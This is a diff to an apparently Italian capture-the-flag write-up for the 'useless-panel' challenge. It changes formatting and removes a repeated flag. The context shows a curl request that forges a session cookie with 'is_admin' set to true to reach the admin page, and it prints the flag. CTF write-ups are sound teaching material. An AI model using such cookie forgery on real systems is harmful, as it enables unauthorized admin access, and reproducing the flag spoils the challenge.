@@ -8,7 +8,7 @@ Nei devtools del browser però, guardando la rete e poi i request cookies, trovi
 ```
 
 Ci basta modificare il valore "is_admin" da *false* a *true* in un qualsiasi modo, ad esempio con curl:
-```
+```bash
 curl -i -X GET "http://useless-panel.challs.olicyber.it/admin" \
 -H "Cookie: session={\"user\":{\"username\":\"emma\",\"password\":\"12345678\",\"is_admin\":true,\"description\":\"prova\",\"notes\":[\"prova\"]}}"
 ```
@@ -25,5 +25,3 @@ X-Powered-By: Express
 
 flag{never_trust_user_provided_cookies}
 ```
-
-**flag{never_trust_user_provided_cookies}**
